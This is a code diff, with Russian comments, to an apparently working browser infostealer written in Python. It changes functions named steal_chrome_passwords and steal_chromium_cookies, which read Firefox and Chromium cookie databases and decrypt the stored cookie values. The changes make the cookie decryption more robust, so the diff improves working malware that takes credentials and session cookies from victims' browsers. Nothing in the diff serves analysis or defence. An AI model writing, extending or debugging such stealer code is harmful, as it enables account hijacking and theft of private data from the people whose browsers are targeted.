@@ -19,9 +19,6 @@ import cv2
 import sys
 from pathlib import Path
 from Cryptodome.Cipher import AES
-import sqlite3
-import base64
-from Cryptodome.Cipher import AES
 
 # Исправленный импорт для Windows-специфичных модулей
 if platform.system() == "Windows":
@@ -67,7 +64,7 @@ BROWSERS = {
 }
 
 # =============================================
-# ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES (ДОБАВЛЕНЫ)
+# ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES
 # =============================================
 
 def get_firefox_profiles():
@@ -143,7 +140,7 @@ def get_firefox_cookies():
     return all_cookies
 
 # =============================================
-# ОСНОВНОЙ КОД (С ИНТЕГРИРОВАННЫМИ ИЗМЕНЕНИЯМИ)
+# ОСНОВНОЙ КОД С ИСПРАВЛЕННОЙ ФУНКЦИЕЙ CHROMIUM COOKIES
 # =============================================
 
 def create_directories():
@@ -508,7 +505,7 @@ def steal_chrome_passwords(browser_name, profile_path):
         return []
 
 def steal_chromium_cookies(browser_name, profile_path):
-    """Крадет куки из браузеров на основе Chromium"""
+    """Крадет куки из браузеров на основе Chromium с улучшенной обработкой"""
     try:
         key = get_encryption_key(str(Path(profile_path).parent))
         cookie_db = os.path.join(profile_path, "Network", "Cookies")
@@ -532,18 +529,26 @@ def steal_chromium_cookies(browser_name, profile_path):
                 
                 # Приоритет 1: Расшифровать encrypted_value
                 if encrypted_value and isinstance(encrypted_value, bytes):
-                    decrypted_value = decrypt_password(encrypted_value, key)
-                    if decrypted_value:
-                        cookie_value = decrypted_value
-                    else:
-                        # Если расшифровка не удалась, сохраняем зашифрованное значение в Base64
-                        cookie_value = base64.b64encode(encrypted_value).decode('utf-8')
+                    try:
+                        decrypted_value = decrypt_password(encrypted_value, key)
+                        if decrypted_value:
+                            cookie_value = decrypted_value
+                        else:
+                            # Если расшифровка не удалась, сохраняем как зашифрованные данные с префиксом
+                            cookie_value = "ENCRYPTED_VALUE:" + base64.b64encode(encrypted_value).decode('utf-8')
+                    except Exception as e:
+                        # При ошибке расшифровки сохраняем зашифрованное значение с префиксом
+                        cookie_value = "ENCRYPTED_VALUE:" + base64.b64encode(encrypted_value).decode('utf-8')
                 else:
-                    cookie_value = value if value else ""
+                    # Если нет encrypted_value, используем обычное значение
+                    cookie_value = value.decode('utf-8', errors='ignore') if isinstance(value, bytes) else value
                 
                 # Если получили пустую строку, пробуем value как есть
                 if not cookie_value and value:
-                    cookie_value = value
+                    if isinstance(value, bytes):
+                        cookie_value = "BYTES_VALUE:" + base64.b64encode(value).decode('utf-8')
+                    else:
+                        cookie_value = value
                 
                 cookies.append({
                     'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
